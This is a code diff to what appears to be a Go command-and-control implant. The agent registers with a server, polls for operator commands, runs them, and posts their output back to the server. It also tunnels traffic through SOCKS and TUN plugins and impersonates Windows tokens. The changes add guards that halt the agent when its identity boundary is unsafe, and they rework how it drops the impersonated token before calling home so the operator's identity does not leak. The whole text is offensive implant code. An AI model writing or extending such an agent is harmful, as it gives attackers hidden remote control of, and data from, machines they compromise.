@@ -211,8 +211,11 @@ func runAgentLoop(ctx context.Context) {
 	defer stopPlatformWorkers()
 
 	for ctx.Err() == nil {
+		if identityBoundaryFault.Load() {
+			return
+		}
 		if err := register(client, cfg); err != nil {
-			if ctx.Err() != nil {
+			if ctx.Err() != nil || errors.Is(err, errIdentityUnsafe) {
 				return
 			}
 			if isSessionTerminatedError(err) {
@@ -224,7 +227,7 @@ func runAgentLoop(ctx context.Context) {
 			continue
 		}
 		if err := pollOnce(client, cfg, socksPlugin, tunPlugin); err != nil {
-			if ctx.Err() != nil {
+			if ctx.Err() != nil || errors.Is(err, errIdentityUnsafe) {
 				return
 			}
 			if err.Error() == "session terminated by server" {
@@ -437,17 +440,8 @@ func pollOnce(
 	output, resultType := execute(reply.Command, cfg, client)
 	query := values(cfg)
 	query.Set("type", resultType)
-	// Revert thread impersonation before calling home. A Type 9 (make_token)
-	// token on the OS thread would be used by Windows for outbound auth,
-	// including NTLM proxy authentication, which would leak the operator
-	// identity to the C2 path. temporarilyRevertForCallback releases both
-	// the impersonation and the OS-thread lock so the HTTP call runs clean.
-	// reestablishThreadToken restores the token afterwards so subsequent
-	// operator commands stay authenticated.
-	temporarilyRevertForCallback()
 	_, err = request(client, cfg, http.MethodPost, "/result", query, []byte(output))
 	_ = register(client, cfg)
-	reestablishThreadToken()
 	return err
 }
 
@@ -466,6 +460,9 @@ func newHTTPClient(cfg *config) *http.Client {
 }
 
 func execute(command string, cfg *config, client *http.Client) (string, string) {
+	if identityBoundaryFault.Load() {
+		return errIdentityUnsafe.Error(), "output"
+	}
 	trimmed := strings.TrimSpace(command)
 	if strings.HasPrefix(trimmed, "__CONFIG__ ") {
 		parts := strings.Fields(trimmed)
@@ -951,6 +948,14 @@ func request(client *http.Client, cfg *config, method, endpoint string, query ur
 // requestContext performs one authenticated beacon request and lets a
 // persistent plugin cancel an in-flight artifact download during shutdown.
 func requestContext(ctx context.Context, client *http.Client, cfg *config, method, endpoint string, query url.Values, body []byte) ([]byte, error) {
+	return runServerRequest(func() ([]byte, error) {
+		return requestAsProcess(ctx, client, cfg, method, endpoint, query, body)
+	}, suspendServerIdentity)
+}
+
+// requestAsProcess keeps request construction, transport, body reads, and close
+// inside the thread-identity guard provided by requestContext.
+func requestAsProcess(ctx context.Context, client *http.Client, cfg *config, method, endpoint string, query url.Values, body []byte) ([]byte, error) {
 	u := cfg.BaseURL + endpoint + "?" + query.Encode()
 	var reader io.Reader
 	if body != nil {
